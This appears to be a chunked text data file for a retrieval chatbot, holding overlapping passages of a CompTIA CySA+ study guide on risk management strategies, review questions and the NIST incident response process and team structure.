rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	controls is a common strategy in many different organizations, even those not subject to PCI DSS. Compensating controls balance the fact that it simply isn’t possible to implement every required security control in every circumstance with the desire to manage risk to the greatest feasible degree. In many cases, organizations adopt compensating controls to address a temporary exception to a security requirement. In those cases, the organization should also develop remediation plans designed to bring the organization back into compliance with the letter and intent of the original control. Exam Essentials 333 Summary Cybersecurity efforts are all about risk and vulnerability management. In this chapter, you learned about the techniques that cybersecurity analysts use to identify, assess, and manage a wide variety of risks and vulnerabilities. You learned about the differences between risk mitigation, risk avoidance, risk transference, and risk acceptance and when it is appropriate to use each. You also explored the different types of security controls that organizations can use to mitigate risks. In the next chapter, we begin to explore Domain 3: Incident Response and Management. Exam Essentials Explain how risk identification and assessment helps organizations prioritize cybersecurity efforts. Cybersecurity analysts seek to identify all the risks facing their organization and then conduct a business impact analysis to assess the potential degree of risk based on the probability that it will occur and the magnitude of the potential effect on the organization. This work allows security professionals to prioritize risks and communicate risk factors to others in the organization. Know that vendors are a source of external risk. Organizations should conduct their own systems assessments as part of their risk assessment practices, but they should conduct supply chain assessments as well. Performing vendor due diligence reduces the likelihood that a previously unidentified risk at a vendor will negatively impact the organization. Hardware source authenticity techniques verify that hardware was not tampered with after leaving the vendor’s premises. Describe a variety of risk management strategies. Risk avoidance strategies change business practices to eliminate a risk. Risk mitigation techniques seek to reduce the probability or magnitude of a risk. Risk transference approaches move some of the risk to a third party. Risk acceptance acknowledges the risk and continues normal business operations despite the presence of the risk. Understand the use of software security testing tools. Static code analysis tools and techniques analyze the structure and content of code without executing the code itself. Dynamic analysis techniques actually execute the code. Fuzzing is a common dynamic testing technique that sends artificially generated input to an application. Debuggers are used to try to reverse-­engineer the source code from an executable file. Describe policy frameworks and what they consist of. Policies are high-­level statements of management intent for the information security program. Standards describe the detailed implementation requirements for policy. Procedures offer step-­by-­step instructions for 334 Chapter 8 ■ Responding to Vulnerabilities carrying out security activities. Compliance with policies, standards, and procedures is mandatory. Guidelines offer optional advice that complements other elements
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	executing the code itself. Dynamic analysis techniques actually execute the code. Fuzzing is a common dynamic testing technique that sends artificially generated input to an application. Debuggers are used to try to reverse-­engineer the source code from an executable file. Describe policy frameworks and what they consist of. Policies are high-­level statements of management intent for the information security program. Standards describe the detailed implementation requirements for policy. Procedures offer step-­by-­step instructions for 334 Chapter 8 ■ Responding to Vulnerabilities carrying out security activities. Compliance with policies, standards, and procedures is mandatory. Guidelines offer optional advice that complements other elements of the policy framework. Frameworks used to set security approaches may be either prescriptive or risk-based. Describe how organizations often adopt a set of security policies covering different areas of their security programs. Common policies used in security programs include an information security policy, an acceptable use policy, a data ownership policy, a data retention policy, an account management policy, and a password policy. The specific policies adopted by any organization will depend on that organization’s culture and business needs. Know that policy documents should include exception processes. Exception processes should outline the information required to receive an exception to security policy and the approval authority for each exception. The process should also describe the requirements for compensating controls that mitigate risks associated with approved security policy exceptions. Lab Exercises Activity 8.1: Risk Management Strategies Match the following risk management strategies with their descriptions. Risk avoidance Choosing to continue operations as normal despite the potential risk Risk transference Changing business activities to eliminate a risk Risk mitigation Shifting the impact of a risk to another organization Risk acceptance Implementing security controls that reduce the probability and/or magnitude of a risk Activity 8.2: Risk Identification and Assessment For this exercise, use your own organization. If you are not currently employed, you may use your school or another organization that you are familiar with. Think of a business process that is critical to your organization’s continued existence. Identify all the risks to the continued operation of that business process. Then choose one of those risks and conduct a quantitative or qualitative risk assessment of that risk. Lab Exercises Activity 8.3: Risk Management Take the risk assessment that you developed in Activity 8.2. Identify at least one way that you could use each of the following risk management strategies to address that risk: ■■ Risk mitigation ■■ Risk avoidance ■■ Risk acceptance ■■ Risk transference Which of these strategies do you feel is most appropriate for your scenario? Why? Feel free to choose more than one strategy if you believe it is the best way to manage the risk. 335 Chapter 8 336 ■ Responding to Vulnerabilities Review Questions 1. 2. Jen identified a missing patch on a Windows server that might allow an attacker to gain remote control of the system. After consulting with her manager, she applied the patch. From a risk management perspective, what has she done? A. Removed the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	■■ Risk mitigation ■■ Risk avoidance ■■ Risk acceptance ■■ Risk transference Which of these strategies do you feel is most appropriate for your scenario? Why? Feel free to choose more than one strategy if you believe it is the best way to manage the risk. 335 Chapter 8 336 ■ Responding to Vulnerabilities Review Questions 1. 2. Jen identified a missing patch on a Windows server that might allow an attacker to gain remote control of the system. After consulting with her manager, she applied the patch. From a risk management perspective, what has she done? A. Removed the threat B. Reduced the threat C. Removed the vulnerability D. Reduced the vulnerability You notice a high number of SQL injection attacks against a web application run by your organization and you install a web application firewall to block many of these attacks before they reach the server. How have you altered the severity of this risk? A. Reduced the magnitude B. Eliminated the vulnerability C. Reduced the probability D. Eliminated the threat Questions 3 through 7 refer to the following scenario. Aziz is responsible for the administration of an e-commerce website that generates $100,000 per day in revenue for his firm. The website uses a database that contains sensitive information about the firm’s customers. He expects that a compromise of that database would result in $500,000 of fines against his firm. Aziz is assessing the risk of a SQL injection attack against the database where the attacker would steal all of the customer personally identifiable information (PII) from the database. After consulting threat intelligence, he believes that there is a 5% chance of a successful attack in any given year. 3. 4. 5. What is the asset value (AV)? A. $5,000 B. $100,000 C. $500,000 D. $600,000 What is the exposure factor (EF)? A. 5% B. 20% C. 50% D. 100% What is the single loss expectancy (SLE)? A. $5,000 B. $100,000 Review Questions 6. 7. C. $500,000 D. $600,000 337 What is the annualized rate of occurrence (ARO)? A. 0.05 B. 0.20 C. 2.00 D. 5.00 What is the annualized loss expectancy (ALE)? A. $5,000 B. $25,000 C. $100,000 D. $500,000 Questions 8–11 refer to the following scenario. Grace recently completed a risk assessment of her organization’s exposure to data breaches and determined that there is a high level of risk related to the loss of sensitive personal information. She is considering a variety of approaches to managing this risk. 8. 9. Grace’s first idea is to add a web application firewall to protect her organization against SQL injection attacks. What risk management strategy does this approach adopt? A. Risk acceptance B. Risk avoidance C. Risk mitigation D. Risk transference Business leaders are considering dropping the customer activities that collect and store sensitive personal information. What risk management strategy would this approach use? A. Risk acceptance B. Risk avoidance C. Risk mitigation D. Risk transference 10. The business decided to install the web application firewall and continue doing
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	information. She is considering a variety of approaches to managing this risk. 8. 9. Grace’s first idea is to add a web application firewall to protect her organization against SQL injection attacks. What risk management strategy does this approach adopt? A. Risk acceptance B. Risk avoidance C. Risk mitigation D. Risk transference Business leaders are considering dropping the customer activities that collect and store sensitive personal information. What risk management strategy would this approach use? A. Risk acceptance B. Risk avoidance C. Risk mitigation D. Risk transference 10. The business decided to install the web application firewall and continue doing business. They still were worried about other risks to the information that were not addressed by the firewall and consider purchasing an insurance policy to cover those risks. What strategy does this use? A. Risk acceptance B. Risk avoidance C. Risk mitigation D. Risk transference Chapter 8 338 ■ Responding to Vulnerabilities 11. In the end, risk managers found that the insurance policy was too expensive and opted not to purchase it. They are taking no additional action. What risk management strategy is being used in this situation? A. Risk acceptance B. Risk avoidance C. Risk mitigation D. Risk transference 12. Which of the following is a formal process that allows organizations to open their systems to inspection by security researchers in a controlled environment? A. Edge discovery B. Passive discovery C. Security controls testing D. Bug bounty 13. Which of the following is often used to assist with the prevention of XSS and SQL injection attacks? A. Secure session management B. Input validation C. SLOs D. Maintenance windows 14. Which of the following is designed specifically to support penetration testing and the reverse engineering of malware? A. Immunity debugger B. GDB C. SDLC D. Parameterized queries 15. Jason gathers threat intelligence that notes that an adversary that his organization considers a threat likes to use USB key drops to compromise their targets. What is this an example of? A. His organization’s attack surface B. A possible attack vector C. An example of adversary capability D. A probability assessment 16. What type of assessment is particularly useful for identifying insider threats? A. Behavioral B. Instinctual C. Habitual D. IOCs Review Questions 339 17. STRIDE, PASTA, and LIDDUN are all examples of what? A. Zero-­day rating systems B. Vulnerability assessment tools C. Adversary analysis tools D. Threat classification tools 18. What type of software testing tool executes the code as it is being tested? A. Static analysis B. Dynamic analysis C. Compilation D. Decompilation 19. Adam is conducting software testing by reviewing the source code of the application. What type of code testing is Adam conducting? A. Mutation testing B. Static code analysis C. Dynamic code analysis D. Fuzzing 20. During testing, Tiffany slowly increases the number of connections to an application until it fails. What is she doing? A. Regression testing B. Unit testing C. Stress testing D. Fagan testing Incident Response and Management DOMAIN III Chapter 9 Building an
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	type of software testing tool executes the code as it is being tested? A. Static analysis B. Dynamic analysis C. Compilation D. Decompilation 19. Adam is conducting software testing by reviewing the source code of the application. What type of code testing is Adam conducting? A. Mutation testing B. Static code analysis C. Dynamic code analysis D. Fuzzing 20. During testing, Tiffany slowly increases the number of connections to an application until it fails. What is she doing? A. Regression testing B. Unit testing C. Stress testing D. Fagan testing Incident Response and Management DOMAIN III Chapter 9 Building an Incident Response Program THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 3.0: Incident Response and Management ■■ 3.1 Explain concepts related to attack methodology frameworks ■■ Cyber kill chain ■■ Diamond Model of Intrusion Analysis ■■ MITRE ATT&CK ■■ Open Source Security Testing Methodology Manual (OSS TMM) ■■ ■■ 3.2 Given a scenario, perform incident response activities ■■ ■■ OWASP Testing Guide Containment, eradication, and recovery 3.3 Explain the preparation and post-­incident activity phases of the incident management life cycle ■■ Preparation ■■ Post-­incident activity No matter how well an organization prepares its cybersecurity defenses, the time will come that it suffers a computer security incident that compromises the confidentiality, integrity, and availability of information or systems under its control. This incident may be a minor virus infection that is quickly remediated or a serious breach of personal information that comes into the national media spotlight. In either event, the organization must be prepared to conduct a coordinated, methodical response effort. By planning in advance, business leaders, technology leaders, cybersecurity experts, and technologists can decide how they will handle these situations and prepare a well-­thought-­out response. Security Incidents Many IT professionals use the terms security event and security incident casually and interchangeably, but this is not correct. Members of a cybersecurity incident response team should use these terms carefully and according to their precise definitions within the organization. The National Institute for Standards and Technology (NIST) offers the following standard definitions for use throughout the U.S. government, and many private organizations choose to adopt them as well: ■■ ■■ ■■ An event is any observable occurrence in a system or network. A security event includes any observable occurrence that relates to a security function. For example, a user accessing a file stored on a server, an administrator changing permissions on a shared folder, and an attacker conducting a port scan are all examples of security events. An adverse event is any event that has negative consequences. Examples of adverse events include a malware infection on a system, a server crash, and a user accessing a file that they are not authorized to view. A security incident is a violation or imminent threat of violation of computer security policies, acceptable use policies, or standard security practices. Examples of security incidents include the accidental loss of sensitive information, an intrusion into a computer system by an
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	server, an administrator changing permissions on a shared folder, and an attacker conducting a port scan are all examples of security events. An adverse event is any event that has negative consequences. Examples of adverse events include a malware infection on a system, a server crash, and a user accessing a file that they are not authorized to view. A security incident is a violation or imminent threat of violation of computer security policies, acceptable use policies, or standard security practices. Examples of security incidents include the accidental loss of sensitive information, an intrusion into a computer system by an attacker, the use of a keylogger on an executive’s system to steal passwords, and the launch of a denial-­of-­service attack against a website. Every security incident includes one or more security events, but not every security event is a security incident. Phases of Incident Response 345 Computer security incident response teams (CSIRTs) are responsible for responding to computer security incidents that occur within an organization by following standardized response procedures and incorporating their subject matter expertise and professional judgment. For brevity’s sake, we will use the term incident as shorthand for computer security incident in the remainder of this book. Phases of Incident Response Organizations depend on members of the CSIRT to respond calmly and consistently in the event of a security incident. The crisis-­like atmosphere that surrounds many security incidents may lead to poor decision-making unless the organization has a clearly thought-­ out and refined process that describes how it will handle cybersecurity incident response. Figure 9.1 shows the simple incident response process advocated by NIST. FIGURE 9.1 Incident response process Preparation Detection & Analysis Containment Eradication & Recovery Post-Incident Activity Source: NIST SP 800-61: Computer Security Incident Handling Guide https://nvlpubs.nist.gov/nistpubs/ specialpublications/nist.sp.800-61r2.pdf / last accessed February 15, 2023. Notice that this process is not a simple progression of steps from start to finish. Instead, it includes loops that allow responders to return to prior phases as needed during the response. These loops reflect the reality of responses to actual cybersecurity incidents. Only in the simplest of incidents would an organization detect an incident, analyze data, conduct a recovery, and close out the incident in a straightforward sequence of steps. Instead, the containment process often includes several loops back through the detection and analysis phase to identify whether the incident has been successfully resolved. These loops are a normal part of the cybersecurity incident response process and should be expected. 346 Chapter 9 ■ Building an Incident Response Program Preparation CSIRTs do not spring up out of thin air. As much as managers may wish it were so, they cannot simply will a CSIRT into existence by creating a policy document and assigning staff members to the CSIRT. Instead, the CSIRT requires careful preparation to ensure that the CSIRT has the proper policy foundation, has operating procedures that will be effective in the organization’s computing environment, receives appropriate training, and is prepared to respond to an incident. The next two
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	of the cybersecurity incident response process and should be expected. 346 Chapter 9 ■ Building an Incident Response Program Preparation CSIRTs do not spring up out of thin air. As much as managers may wish it were so, they cannot simply will a CSIRT into existence by creating a policy document and assigning staff members to the CSIRT. Instead, the CSIRT requires careful preparation to ensure that the CSIRT has the proper policy foundation, has operating procedures that will be effective in the organization’s computing environment, receives appropriate training, and is prepared to respond to an incident. The next two sections of this chapter, “Building the Foundation for Incident Response” and “Creating an Incident Response Team,” describe the preparation phase in greater detail. The preparation phase also includes building strong cybersecurity defenses to reduce the likelihood and impact of future incidents. This process of building a defense-­in-­depth approach to cybersecurity often includes many personnel who might not be part of the CSIRT. The preparation phase of incident response includes training, testing, and documentation of procedures. During the preparation phase, the organization should also assemble the hardware, software, and information required to conduct an incident investigation. NIST recommends that every organization’s incident response toolkit should include, at a minimum, the following: ■■ Digital forensic workstations ■■ Backup devices ■■ Laptops for data collection, analysis, and reporting ■■ Spare server and networking equipment ■■ Blank removable media ■■ Portable printer ■■ Forensic and packet capture software ■■ Bootable USB media containing trusted copies of forensic tools ■■ Office supplies and evidence collection materials You’ll learn more about the tools used to conduct the incident response process in Chapter 10, “Incident Detection and Analysis,” and Chapter 11, “Containment, Eradication, and Recovery.” The preparation phase of the incident response plan is not a “one and done” planning process. Notice in Figure 9.1 that there is a loop from the post-­incident activity phase back to the preparation phase. Whenever the organization is not actively involved in an incident response effort, it should be planning for the next incident. Phases of Incident Response 347 Detection and Analysis The detection and analysis phase of incident response is one of the trickiest to commit to a routine process. Although cybersecurity analysts have many tools at their disposal that may assist in identifying that a security incident is taking place, many incidents are only detected because of the trained eye of an experienced analyst. NIST 800-­61 describes four major categories of security event indicators: ■■ ■■ ■■ ■■ Alerts that originate from intrusion detection and prevention systems, security information and event management systems, antivirus software, file integrity checking software, and/or third-­party monitoring services Logs generated by operating systems, services, applications, network devices, and network flows Publicly available information about new vulnerabilities and exploits detected “in the wild” or in a controlled laboratory environment People from inside the organization or external sources who report suspicious activity that may indicate a security incident is in progress When any of these information
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	eye of an experienced analyst. NIST 800-­61 describes four major categories of security event indicators: ■■ ■■ ■■ ■■ Alerts that originate from intrusion detection and prevention systems, security information and event management systems, antivirus software, file integrity checking software, and/or third-­party monitoring services Logs generated by operating systems, services, applications, network devices, and network flows Publicly available information about new vulnerabilities and exploits detected “in the wild” or in a controlled laboratory environment People from inside the organization or external sources who report suspicious activity that may indicate a security incident is in progress When any of these information sources indicate that a security incident may be occurring, cybersecurity analysts should shift into the initial validation mode, where they attempt to determine whether an incident is taking place that merits further activation of the incident response process. This analysis is often more art than science and is very difficult work. NIST recommends the following actions to improve the effectiveness of incident analysis: Profile networks and systems to measure the characteristics of expected activity. This will improve the organization’s ability to identify abnormal activity during the detection and analysis process. Understand normal behavior of users, systems, networks, and applications. This behavior will vary between organizations, at different times of the day, week, and year and with changes in the business cycle. A solid understanding of normal behavior is critical to recognizing deviations from those patterns. Create a logging policy that specifies the information that must be logged by systems, applications, and network devices. The policy should also specify where those log records should be stored (preferably in a centralized log management system) and the retention period for logs. Perform event correlation to combine information from multiple sources. This function is typically performed by a security information and event management (SIEM) system. Synchronize clocks across servers, workstations, and network devices. This is done to facilitate the correlation of log entries from different systems. Organizations may easily achieve this objective by operating a Network Time Protocol (NTP) server. Maintain an organizationwide knowledge base that contains critical information about systems and applications. This knowledge base should include information about 348 Chapter 9 ■ Building an Incident Response Program system profiles, usage patterns, and other information that may be useful to responders who are not familiar with the inner workings of a system. Capture network traffic as soon as an incident is suspected. If the organization does not routinely capture network traffic, responders should immediately begin packet captures during the detection and analysis phase. This information may provide critical details about an attacker’s intentions and activity. Filter information to reduce clutter. Incident investigations generate massive amounts of information, and it is basically impossible to interpret it all without both inclusion and exclusion filters. Incident response teams may wish to create some predefined filters during the preparation phase to assist with future analysis efforts. Seek assistance from external resources. Responders should know the parameters for involving outside sources in their response efforts. This may be
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the organization does not routinely capture network traffic, responders should immediately begin packet captures during the detection and analysis phase. This information may provide critical details about an attacker’s intentions and activity. Filter information to reduce clutter. Incident investigations generate massive amounts of information, and it is basically impossible to interpret it all without both inclusion and exclusion filters. Incident response teams may wish to create some predefined filters during the preparation phase to assist with future analysis efforts. Seek assistance from external resources. Responders should know the parameters for involving outside sources in their response efforts. This may be as simple as conducting a Google search for a strange error message, or it may involve full-­fledged coordination with other response teams. Although it isn’t part of the NIST recommendations, you may also find yourself using reverse engineering techniques to investigate the origins and/or intent of malware used in a security incident. You learned about reverse engineering in Chapter 1, “Today’s Cybersecurity Analyst.” You’ll learn more about the process of detecting and analyzing a security incident in Chapter 10. The detection and analysis phase of incident response includes the initial identification and investigation of a security incident. Containment, Eradication, and Recovery During the incident detection and analysis phase, the CSIRT engages in primarily passive activities designed to uncover and analyze information about the incident. After completing this assessment, the team moves on to take active measures designed to contain the effects of the incident, eradicate the incident from the network, and recover normal operations. At a high level, the containment, eradication, and recovery phase of the process is designed to achieve these objectives: 1. Select a containment strategy appropriate to the incident circumstances. 2. Implement the selected containment strategy to limit the damage caused by the incident. 3. Gather additional evidence as needed to support the response effort and potential legal action. Phases of Incident Response 4. Identify the attackers and attacking systems. 5. Eradicate the effects of the incident and recover normal business operations. 349 You’ll learn more about the techniques used during the containment, eradication, and recovery phase of incident response in Chapter 11. The containment, eradication, and recovery phase of incident response includes isolating systems to contain the damage caused by an incident, eradicating the effects of the incident, and recovering normal business operations. Post-­Incident Activity Security incidents don’t end after security professionals remove attackers from the network or complete the recovery effort to restore normal business operations. Once the immediate danger passes and normal operations resume, the CSIRT enters the post-­incident activity phase of incident response. During this phase, team members undertake forensic procedures, perform a root cause analysis, conduct a lessons learned review, and ensure that they meet internal and external evidence retention requirements. Forensic Analysis One of the primary goals of post-­incident activity is to determine what actually occurred during an incident. Forensic analysis techniques help you carefully and methodically sift through mountains of digital evidence to reconstruct the details of an incident. You’ll
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	network or complete the recovery effort to restore normal business operations. Once the immediate danger passes and normal operations resume, the CSIRT enters the post-­incident activity phase of incident response. During this phase, team members undertake forensic procedures, perform a root cause analysis, conduct a lessons learned review, and ensure that they meet internal and external evidence retention requirements. Forensic Analysis One of the primary goals of post-­incident activity is to determine what actually occurred during an incident. Forensic analysis techniques help you carefully and methodically sift through mountains of digital evidence to reconstruct the details of an incident. You’ll learn more about forensic techniques in Chapter 13, “Performing Forensic Analysis and Techniques for Incident Response.” Root Cause Analysis In the aftermath of an incident, cybersecurity analysts should develop a clear understanding of the incident’s root cause. This root cause analysis is critical to implementing a secure recovery that corrects any control deficiencies that led to the original attack. After all, if you don’t understand how an attacker breached your security controls in the first place, it will be hard to correct those controls so that the attack doesn’t reoccur! Lessons Learned Review During the lessons learned review, responders conduct a thorough review of the incident and their response, with an eye toward improving procedures and tools for the next incident. This review is most effective if conducted during a meeting where everyone is present for the discussion (physically or virtually). Although some organizations try to conduct lessons learned reviews in an offline manner, this approach does not lead to the back-­and-­forth discussion that often yields the greatest insight. 350 Chapter 9 ■ Building an Incident Response Program The lessons learned review should be facilitated by an independent facilitator who was not involved in the incident response and is perceived by everyone involved as an objective outsider. This allows the facilitator to guide the discussion in a productive manner without participants feeling that the facilitator is advancing a hidden agenda. NIST recommends that lessons learned processes answer the following questions: ■■ Exactly what happened and at what times? ■■ How well did staff and management perform in responding to the incident? ■■ Were the documented procedures followed? Were they adequate? ■■ What information was needed sooner? ■■ Were any steps or actions taken that might have inhibited the recovery? ■■ What would the staff and management do differently the next time a similar incident occurs? ■■ How could information sharing with other organizations have been improved? ■■ What corrective actions can prevent similar incidents in the future? ■■ ■■ What precursors or indicators should be watched for in the future to detect similar incidents? What additional tools or resources are needed to detect, analyze, and mitigate future incidents? Once the group answers these questions, management must ensure that the organization takes follow-­up actions, as appropriate. Lessons learned reviews are only effective if they surface needed changes and those changes then occur to improve future incident response efforts. Exam Note The
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	time a similar incident occurs? ■■ How could information sharing with other organizations have been improved? ■■ What corrective actions can prevent similar incidents in the future? ■■ ■■ What precursors or indicators should be watched for in the future to detect similar incidents? What additional tools or resources are needed to detect, analyze, and mitigate future incidents? Once the group answers these questions, management must ensure that the organization takes follow-­up actions, as appropriate. Lessons learned reviews are only effective if they surface needed changes and those changes then occur to improve future incident response efforts. Exam Note The CySA+ exam outline calls out forensic analysis, root cause analysis, and lessons learned. Remember that these are considered post-­incident activities. Evidence Retention At the conclusion of an incident, the CSIRT has often gathered large quantities of evidence. The team leader should work with staff to identify both internal and external evidence retention requirements. If the incident may result in civil litigation or criminal prosecution, the team should consult attorneys prior to discarding any evidence. If there is no likelihood that the evidence will be used in court, the team should follow any retention policies that the organization has in place. Building the Foundation for Incident Response 351 If the organization does not have an existing evidence retention policy for cybersecurity incidents, now would be a good time to create one. Many organizations choose to implement a two-­year retention period for evidence not covered by other requirements. This allows incident handlers time to review the evidence at a later date during incident handling program reviews or while handling future similar incidents. At the conclusion of the post-­incident activity phase, the CSIRT deactivates, and the incident-­handling cycle returns to the preparation, detect, and analyze phases. U.S. federal government agencies must retain all incident-­handling records for at least three years. This requirement appears in the National Archives General Records Schedule 3.2, Item 20. See www.archives .gov/files/records-­mgmt/grs/grs03-­2.pdf for more information. You’ll read more about the activities undertaken during the post-­incident activity phase in Chapter 11. Building the Foundation for Incident Response One of the major responsibilities that organizations have during the preparation phase of incident response is building a solid policy and procedure foundation for the program. This creates the documentation required to support the program’s ongoing efforts. Exam Tip Incident response plans are closely related to an organization’s business continuity (BC) and disaster recovery (DR) programs. The goal of the business continuity program is to ensure that the organization is able to maintain normal operations even during an unexpected event. When an incident strikes, business continuity controls may protect the business’ core functions from disruption. The goal of the disaster recovery program is to help the organization quickly recover normal operations if they are disrupted. An incident may cause service disruptions that would trigger the disaster recovery plan. Due to the closely related nature of these programs, teams working on incident response should carefully coordinate their work with teams working on BC/DR efforts.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	recovery (DR) programs. The goal of the business continuity program is to ensure that the organization is able to maintain normal operations even during an unexpected event. When an incident strikes, business continuity controls may protect the business’ core functions from disruption. The goal of the disaster recovery program is to help the organization quickly recover normal operations if they are disrupted. An incident may cause service disruptions that would trigger the disaster recovery plan. Due to the closely related nature of these programs, teams working on incident response should carefully coordinate their work with teams working on BC/DR efforts. Chapter 9 352 ■ Building an Incident Response Program Policy The incident response policy serves as the cornerstone of an organization’s incident response program. This policy should be written to guide efforts at a high level and provide the authority for incident response. The policy should be approved at the highest level possible within the organization, preferably by the chief executive officer. For this reason, policy authors should attempt to write the policy in a manner that makes it relatively timeless. This means that the policy should contain statements that provide authority for incident response, assign responsibility to the CSIRT, and describe the role of individual users and state organizational priorities. The policy is not the place to describe specific technologies, response procedures, or evidence-­gathering techniques. Those details may change frequently and should be covered in more easily changed procedure documents. NIST recommends that incident response policies contain these key elements: ■■ Statement of management commitment ■■ Purpose and objectives of the policy ■■ Scope of the policy (to whom it applies and under what circumstances) ■■ Definition of cybersecurity incidents and related terms ■■ Organizational structure and definition of roles, responsibilities, and level of authority ■■ Prioritization or severity rating scheme for incidents ■■ Performance measures for the CSIRT ■■ Reporting and contact forms Including these elements in the policy provides a solid foundation for the CSIRT’s routine and crisis activities. Procedures and Playbooks Procedures provide the detailed, tactical information that CSIRT members need when responding to an incident. They represent the collective wisdom of team members and subject matter experts collected during periods of calm and are ready to be applied in the event of an actual incident. CSIRT teams often develop playbooks that describe the specific procedures that they will follow in the event of a specific type of cybersecurity incident. For example, a financial institution CSIRT might develop playbooks that cover: ■■ Breach of personal financial information ■■ Web server defacement ■■ Phishing attack targeted at customers ■■ Loss of a laptop ■■ General security incident not covered by another playbook This is clearly not an exhaustive list, and each organization will develop playbooks that describe their response to both high severity and frequently occurring incident categories. Building the Foundation for Incident Response 353 The idea behind the playbook is that the team should be able to pick it up and find an operational plan for
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	type of cybersecurity incident. For example, a financial institution CSIRT might develop playbooks that cover: ■■ Breach of personal financial information ■■ Web server defacement ■■ Phishing attack targeted at customers ■■ Loss of a laptop ■■ General security incident not covered by another playbook This is clearly not an exhaustive list, and each organization will develop playbooks that describe their response to both high severity and frequently occurring incident categories. Building the Foundation for Incident Response 353 The idea behind the playbook is that the team should be able to pick it up and find an operational plan for responding to the security incident that they may follow. Playbooks are especially important in the early hours of incident response to ensure that the team has a planned, measured response to the first reports of a potential incident. For good examples of real-­world cybersecurity incident playbooks, see the Ransomware Playbook (http://xsoar.pan.dev/docs/reference/ playbooks/playbook3) or the Windows incident response playbook from the University of Central Florida (http://infosec.ucf.edu/wp-­ content/uploads/sites/2/2019/07/Procedure_for_Windows_ Incident_Response.pdf). Exam Note Playbooks are designed to be step-­by-­step recipe-­style responses to cybersecurity incidents. They should guide the team’s response, but they are not a substitute for professional judgment. The responders handling an incident should have appropriate professional expertise and the authority to deviate from the playbook when circumstances require a different approach. Documenting the Incident Response Plan When developing the incident response plan documentation, organizations should pay particular attention to creating tools that may be useful during an incident response. These tools should provide clear guidance to response teams that may be quickly read and interpreted during a crisis situation. For example, the incident response checklist shown in Figure 9.2 provides a high-­level overview of the incident response process in checklist form. The CSIRT leader may use this checklist to ensure that the team doesn’t miss an important step in the heat of the crisis environment. The National Institute of Standards and Technology publishes a Computer Security Incident Handling Guide (SP 800-­61) that contains a wealth of information that is useful to both government agencies and private organizations developing incident response plans. The current version of the guide, NIST SP 800-­61 revision 2, is available online at http:// nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST .SP.800-­61r2.pdf. 354 Chapter 9 FIGURE 9.2 ■ Building an Incident Response Program Incident response checklist Source: NIST SP 800-61: Computer Security Incident Handling Guide https://nvlpubs.nist.gov/nistpubs/ specialpublications/nist.sp.800-61r2.pdf / last accessed February 15, 2023. Creating an Incident Response Team There are many different roles that should be represented on a CSIRT. Depending on the organization and its technical needs, some of these roles may be core team members who are always activated, whereas others may be called in as needed on an incident-­by-­incident basis. For example, a database administrator might be crucial when investigating the aftermath of a SQL injection attack but would probably not be very helpful when responding to a stolen laptop. The core incident response team normally consists of cybersecurity professionals with specific expertise in incident response. In larger organizations, these may be
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Incident Response Team There are many different roles that should be represented on a CSIRT. Depending on the organization and its technical needs, some of these roles may be core team members who are always activated, whereas others may be called in as needed on an incident-­by-­incident basis. For example, a database administrator might be crucial when investigating the aftermath of a SQL injection attack but would probably not be very helpful when responding to a stolen laptop. The core incident response team normally consists of cybersecurity professionals with specific expertise in incident response. In larger organizations, these may be full-­time employees dedicated to incident response, whereas smaller organizations may call on cybersecurity experts who fill other roles for their “day jobs” to step into CSIRT roles in the aftermath of an incident. Creating an Incident Response Team 355 The Role of Management Management should have an active role in incident response efforts. The primary responsibility of IT managers and senior leadership is to provide the authority, resources, and time required to respond appropriately to a security incident. This includes ensuring that the CSIRT has the budget and staff required to plan for security incidents and access to subject matter experts during a response. Management may also be called on during an incident response to make critical business decisions about the need to shut down critical servers, communicate with law enforcement or the general public, and assess the impact of an incident on key stakeholders. In addition to the core team members, the CSIRT may include representation from the following: ■■ ■■ ■■ ■■ ■■ Technical subject matter experts whose knowledge may be required during a response. This includes system engineers, network administrators, database administrators, desktop experts, and application experts IT support staff who may be needed to carry out actions directed by the CSIRT Legal counsel responsible for ensuring that the team’s actions comply with legal, policy, and regulatory requirements and can advise team leaders on compliance issues and communication with regulatory bodies Human resources staff responsible for investigating potential employee malfeasance Public relations and marketing staff who can coordinate communications with the media and general public The CSIRT should be run by a designated leader with the clear authority to direct incident response efforts and serve as a liaison to management. This leader should be a skilled incident responder who is either assigned to lead the CSIRT as a full-­time responsibility or serves in a cybersecurity leadership position. Incident Response Providers In addition to including internal team members on the CSIRT, the organization may decide to outsource some or all of their actions to an incident response provider. Retaining an incident response provider gives the organization access to expertise that might not otherwise exist inside the firm. This may come at significant expense, so the organizations should decide what types of incidents may be handled internally and which justify the use of an outside provider. Additionally, the organization should understand the provider’s guaranteed response time and ensure that
